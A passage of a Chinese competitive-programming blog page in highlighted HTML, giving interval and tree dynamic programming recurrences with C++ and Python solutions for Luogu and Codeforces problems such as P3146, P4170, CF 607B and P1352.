operator">&lt;=</span> m<span class="token punctuation">;</span> l<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> r <span class="token operator">=</span> m<span class="token punctuation">;</span> r <span class="token operator">>=</span> l<span class="token punctuation">;</span> r<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> r <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> r <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">long</span> <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            tmp <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">+=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">n<span class="token punctuation">,</span> m <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token number">0</span>x <span class="token operator">=</span> <span class="token number">2</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    x <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">2</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    string <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token keyword">for</span> each <span class="token keyword">in</span> string<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> nums<span class="token punctuation">:</span>        num<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    num<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> every <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> each <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span>                           dp<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> r <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span>                           dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> r <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">+=</span> tmp<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><h4 id="P3146-248G"><a href="#P3146-248G" class="headerlink" title="P3146 248G"></a><a href="https://www.luogu.com.cn/problem/P3146">P3146 248G</a></h4><ul><li><p>题意：<br>给定一个数组，期间相等的数字可以两两合并，问最大的合并出的数字是多少。</p></li><li><p>题解：<br>这题可以一眼看出是区间DP。$dp[i][j]$表示区间$[i,j]$能合并出的最大的值。转移方程：</p><p>  枚举$[i,j]$之间的$k$，当$dp[i][k]==dp[k+1][j]$ 时 $dp[i][j]=max(dp[i][k]+1,dp[i][j])$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P4170-涂色"><a href="#P4170-涂色" class="headerlink" title="P4170 涂色"></a><a href="https://www.luogu.com.cn/problem/P4170">P4170 涂色</a></h4><ul><li><p>题意：<br>求最少的染色次数。</p></li><li><p>题解：<br>$dp[i][j]$表示区间$[i,j]$为一个颜色的最少涂色次数。状态转移方程为：</p></li></ul><pre><code>$$dp[i][j]=\left\&#123;\begin&#123;aligned&#125;&amp;min(dp[i+1][j],dp[i][j-1]),if(s[i]==s[j])\\&amp;min(dp[i][j],dp[i][k]+dp[k+1][j]),k \in [i,j)\end&#123;aligned&#125;\right.$$</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string s<span class="token punctuation">;</span>    cin <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> s<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="CF-607B"><a href="#CF-607B" class="headerlink" title="CF 607B"></a><a href="https://codeforces.com/problemset/problem/607/B">CF 607B</a></h4><ul><li><p>题意：<br>定义每次操作能消除一个回文子序列，问消除所有数组的最小操作数是多少。</p></li><li><p>题解：<br>$dp[i][j]$表示消除区间$[i,j]$的最小操作数是多少，则存在状态转移方程：</p></li></ul><pre><code>$$\left\&#123;\begin&#123;aligned&#125;&amp;dp[i][i]=1\\&amp;dp[i][i+1]=1+(num[i]\not =&#123;num[i+1]&#125;)\\&amp;dp[i][j]=min(dp[i][k]+dp[k+1][j],dp[i][j]),k \in [i,j)\end&#123;aligned&#125;\right.$$</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> num<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> num<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="树与图上的动态规划"><a href="#树与图上的动态规划" class="headerlink" title="树与图上的动态规划"></a><a href="https://www.luogu.com.cn/training/214#problems">树与图上的动态规划</a></h3><h4 id="P1352-没有上司的舞会"><a href="#P1352-没有上司的舞会" class="headerlink" title="P1352 没有上司的舞会"></a><a href="https://www.luogu.com.cn/problem/P1352">P1352 没有上司的舞会</a></h4><ul><li><p>题意：<br>给一棵树和树上n个节点的权值，父节点和子节点不能同时取，问最大权值和是多少。</p></li><li><p>题解：<br>$dp[i][0]$表示不取第$i$个节点的最大权值和，$dp[i][1]$表示取第$i$个节点的最大权值和则有状态转移方程:</p></li></ul><pre><code>$$\left\&#123;\begin&#123;aligned&#125;&amp;dp[u][0]+=max(dp[v][0],dp[v][1])    \\&amp;dp[u][1]+=dp[v][0]\end&#123;aligned&#125;\right.$$</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> rec<span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>it <span class="token operator">:</span> rec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token 